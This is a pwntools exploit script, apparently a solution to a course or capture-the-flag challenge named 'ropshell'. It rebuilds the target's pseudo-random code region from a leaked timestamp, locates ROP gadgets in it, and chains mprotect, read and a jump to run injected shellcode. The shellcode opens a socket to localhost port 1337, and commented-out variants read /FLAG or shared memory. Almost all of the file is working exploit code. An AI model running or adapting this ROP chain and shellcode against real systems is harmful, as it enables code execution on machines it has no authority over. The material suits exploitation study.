#!/usr/bin/env python3
# -- coding: utf-8 --

import os
import sys
import pow as pw
from pwn import *

import ctypes
libc = ctypes.CDLL('libc.so.6')

context.arch = 'amd64'
context.os = 'linux'

r = None
if 'qemu' in sys.argv[1:]:
    r = process("qemu-x86_64-static ./ropshell", shell=True)
elif 'bin' in sys.argv[1:]:
    r = process("./ropshell", shell=False)
elif 'local' in sys.argv[1:]:
    r = remote("localhost", 10494)
else:
    r = remote("up23.zoolab.org", 10494)

if type(r) != pwnlib.tubes.process.process:
    pw.solve_pow(r)

# r.interactive()
r.recvuntil(b'Timestamp is ')
t = int(r.recvuntil(b'\n').decode()[0:-1])
r.recvuntil(b'generated at ')
code_addr = int(r.recvuntil(b'\n').decode()[0:-1], 16)

libc.srand(t)
LEN_CODE = (10*0x10000)
LEN_STACK = 8192

codeint = []
for i in range(LEN_CODE//4):
    codeint.append((libc.rand()<<16 | (libc.rand() & 0xffff)) & 0xffffffff) 

codeint[libc.rand() % (LEN_CODE//4 - 1)] = 0xc3050f

code = b''
for i in range(LEN_CODE//4):
    code += codeint[i].to_bytes(4, byteorder='little')

asm_bstr = asm("""pop rax\nret""")
rax_off = code.find(asm_bstr)
pop_rax = code_addr + rax_off

asm_bstr = asm("""pop rdi\nret""")
rdi_off = code.find(asm_bstr)
pop_rdi = code_addr + rdi_off

asm_bstr = asm("""pop rsi\nret""")
rsi_off = code.find(asm_bstr)
pop_rsi = code_addr + rsi_off

asm_bstr = asm("""pop rdx\nret""")
rdx_off = code.find(asm_bstr)
pop_rdx = code_addr + rdx_off

asm_bstr = asm("""syscall\nret""")
sys_off = code.find(asm_bstr)
pop_system = code_addr + sys_off

asm_bstr = asm("""jmp rax""")
jmp_off = code.find(asm_bstr)
pop_jmp_rax = code_addr + jmp_off

# mov qword ptr [rsi], rax ; ret
asm_bstr = asm("""mov qword ptr [rsi], rax\nret""")
mov_off = code.find(asm_bstr)
pop_mov = code_addr + mov_off

print('rax= ', hex(rax_off))
print('rdi= ', hex(rdi_off))
print('rsi= ', hex(rsi_off))
print('rdx= ', hex(rdx_off))
print('sys= ', hex(sys_off))
print('jmp= ', hex(jmp_off))
# print('mov= ', hex(mov_off))
# print('pop_mov= ', hex(pop_mov))

payload = flat(
# # TEST1
#     pop_rax , 60,
#     pop_rdi , 37,
#     pop_system,
#TEST2
    # #mprotect
    pop_rdi, code_addr,
    pop_rsi, LEN_CODE,
    pop_rdx, 7,
    pop_rax, 10, 
    pop_system,
    #read
    pop_rdi, 0,      # rdi = 0 (file descriptor )
    pop_rsi, code_addr,  # rsi = code_array_addr (buffer)
    pop_rdx, LEN_CODE,
    pop_rax, 0, 
    pop_system,

    pop_rax, code_addr,
    pop_jmp_rax,#jmp rax

)
r.send(payload)

# time.sleep(1)
# sh = asm(shellcraft.amd64.linux.cat("/FLAG"))
# r.send(sh)

#///////////////////////////////////////////////////////////////////////////#

# #TEST3
# call shmget to get the shared memory id
# payload = asm("""

#     mov rdi, 0x1337
#     mov rsi, 0
#     mov rdx, 0
#     mov rax, 29
#     syscall

#     mov rdi, rax
#     mov rsi, 0
#     mov rdx, 4096
#     mov rax, 30
#     syscall

#     mov rsi, rax
#     mov rax, 1
#     mov rdi, 1
#     mov rdx, 69
#     syscall

# """)
# time.sleep(1)
# r.send(payload)

#TEST4
payload = asm("""
    /* Create a new socket */
    mov rax, 41
    mov rdi, 2
    mov rsi, 1
    mov rdx, 0
    syscall
    
    /* Save the socket descriptor */
    /*mov rdi, rax*/
    mov r8 , rax
    
    /* Set up the sockaddr structure */
    /* push 0x13370002       sin_port = 1337 (big endian), sin_family = AF_INET (2) */
    /* push 0x0100007F      sin_addr = 127.0.0.1 (little endian) */ 
    mov rax, 0x0100007f37130002
    push rax
    /*push 2  sin_family */
    mov rsi, rsp  /* rsi points to the sockaddr structure */
    
    /* Connect to the server */
    mov rdi, r8
    mov rax, 42
    mov rdx, 16   /* sizeof(struct sockaddr) */
    syscall

    /* Check if connect was successful */
    cmp rax, 0
    jne error

    /* Read from the connected server */
    mov rax, 0
    mov rdi, r8
    sub rsp, 512
    mov rsi, rsp 
    /*lea rsi, [rsp+2048]*/
    mov rdx, 512
    syscall

    /* Write to stdout */
    mov rdx, rax
    mov rax, 1
    /*lea rsi, [rsp+2048]*/
    mov rdi, 1
    syscall

    /* Exit the program */
    mov rax, 60
    xor rdi, rdi
    syscall

error:
    /* Exit with error status */
    mov rax, 60
    mov rdi, 1
    syscall


""")

time.sleep(1)
r.send(payload)

r.interactive()

# vim: set tabstop=4 expandtab shiftwidth=4 softtabstop=4 number cindent fileencoding=utf-8 :